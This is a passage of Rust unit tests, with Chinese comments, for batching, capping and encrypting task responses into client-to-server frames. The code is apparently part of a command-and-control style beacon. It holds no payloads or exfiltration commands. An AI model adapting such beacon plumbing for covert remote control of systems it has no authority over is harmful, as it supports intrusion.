            let plain = encode_batch(&mut pending[..n]);
            let frame = encode_frame_dir(&pubkey, Direction::ClientToServer, counter, &key, &plain);
            assert!(
                frame.is_ok(),
                "prefix frame must seal (prefix {n} items, {} plaintext bytes)",
                plain.len()
            );
            counter += 1;
            pending.drain(..n); // 仅“发送成功”后移除已发前缀（此处模拟成功）
            sent += n;
        }
        assert_eq!(
            sent, total,
            "every response must be deliverable across frames"
        );
        assert!(
            counter >= 2,
            "an over-limit batch must take multiple frames"
        );
    }

    #[test]
    fn frame_prefix_len_guarantees_progress() {
        // 空批次 → 0；非空批次即使预算再小也至少 1 条（否则 flush 死锁）。
        assert_eq!(frame_prefix_len(&[], PACK_BUDGET), 0);
        let pending = vec![TaskResponse {
            task_id: 1,
            response: Response::Output(vec![0u8; nyx_protocol::wire::MAX_BLOB_LEN]),
        }];
        assert_eq!(frame_prefix_len(&pending, 1), 1);
        // 顶着 MAX_BLOB_LEN 的单条仍在 PACK_BUDGET 内（256 KiB < 511 KiB）。
        assert_eq!(frame_prefix_len(&pending, PACK_BUDGET), 1);
    }

    #[test]
    fn cap_pending_drops_oldest_and_keeps_newest() {
        // server 长期不可达：缓存超保留上限时丢最旧、保最新，不无界增长。
        let mk = |id: u64| TaskResponse {
            task_id: id,
            response: Response::Output(vec![b'y'; 1000]),
        };
        let mut pending: Vec<TaskResponse> = (0..10).map(mk).collect();
        // 每条估算 1024 字节；cap 3072 → 恰好保留最新 3 条。
        let dropped = cap_pending(&mut pending, 3072);
        assert_eq!(dropped, 7);
        assert_eq!(pending.len(), 3);
        assert_eq!(
            pending[0].task_id, 7,
            "survivors must be the newest responses"
        );
        // 已在 cap 内不再丢。
        assert_eq!(cap_pending(&mut pending, 3072), 0);
        assert_eq!(pending.len(), 3);
        // 空批次是 no-op；cap 0 清空全部但不 panic。
        assert_eq!(cap_pending(&mut Vec::new(), 0), 0);
        let mut one = vec![mk(42)];
        assert_eq!(cap_pending(&mut one, 0), 1);
        assert!(one.is_empty());
    }

    #[test]
    fn pending_cache_over_frame_limit_never_fails_seal_after_cap_and_split() {
        // 端到端打包语义（无网络）：模拟 server 不可达期间 pending 累积到
        // 超过一帧——先 cap 再按帧切分，封帧必须始终成功（旧代码在此
        // 静默跳过整批，永久卡死）。
        let key = nyx_protocol::crypto::SessionKey::new([0x42; 32]);
        let pubkey = [0x24; 32];
        // 900 条小响应 ≈ 921 KB（估算），超一帧但在 PENDING_CAP 内。
        let mut pending: Vec<TaskResponse> = (0..900)
            .map(|i| TaskResponse {
                task_id: i,
                response: Response::Output(vec![b'z'; 1000]),
            })
            .collect();
        // beacon_send_frame 的打包序列：cap → 前缀 → 封帧。
        assert_eq!(cap_pending(&mut pending, PENDING_CAP), 0);
        let mut frames = 0u64;
        while !pending.is_empty() {
            let n = frame_prefix_len(&pending, PACK_BUDGET);
            assert!(n >= 1, "non-empty batch must always make progress");
            let plain = encode_batch(&mut pending[..n]);
            assert!(
                encode_frame_dir(&pubkey, Direction::ClientToServer, frames, &key, &plain).is_ok(),
                "frame {frames} must seal after cap+split"
            );
            pending.drain(..n);
            frames += 1;
        }
        assert!(frames >= 2, "~921 KB must span multiple frames");
    }
}
